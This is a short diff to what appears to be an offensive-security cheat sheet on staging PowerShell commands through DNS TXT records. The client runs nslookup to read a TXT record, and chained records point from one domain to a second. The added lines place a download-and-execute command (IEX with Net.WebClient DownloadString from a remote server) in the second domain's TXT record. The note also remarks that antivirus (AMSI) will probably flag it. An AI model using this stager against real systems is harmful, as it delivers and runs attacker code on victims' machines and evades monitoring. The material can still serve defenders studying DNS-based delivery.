@@ -30,6 +30,8 @@ Client executing:<br>
 `powershell (nslookup -q=txt domain1.com)[5]`<br><br>
 DNS Server entry (the index may vary):<br>
 `powershell (nslookup -q=txt domain2.com)[5]`<br><br>
+DNS Server TXT entry on domain2.com:<br>
+`IEX (New-Object Net.WebClient).DownloadString('http:/server/payload.html')`<br><br>
 *EXPLANATION: The commands can be chained together with a combination of dns servers. The client requests the first domain, which in return requests the actual commands.on the second server.*<br>
 This will most likely trigger AV (AMSI).<br>
 
